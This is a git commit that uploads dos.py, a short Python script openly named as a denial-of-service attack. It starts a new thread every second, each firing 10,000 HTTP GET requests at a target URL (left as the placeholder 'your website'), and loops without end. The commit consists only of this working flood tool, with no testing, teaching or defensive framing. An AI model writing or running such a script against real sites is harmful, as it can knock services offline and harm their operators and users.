1111132d9a2d38755047713f213ab9cc7ddbabd9
qweqewfa <47049840+qweqewfa@users.noreply.github.com>
2019-04-27 13:41:13 +0600

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,17 @@
+import requests
+import threading
+import time
+
+
+def DosAtack(server, count):
+    for i in range(count):
+        requests.get(server)
+
+
+def startDosAtack(time1, server, count):
+    while True:
+        t1 = threading.Thread(target=DosAtack, args=(server, count))
+        t1.start()
+        time.sleep(time1)
+
+startDosAtack(1, 'your website', 10000)
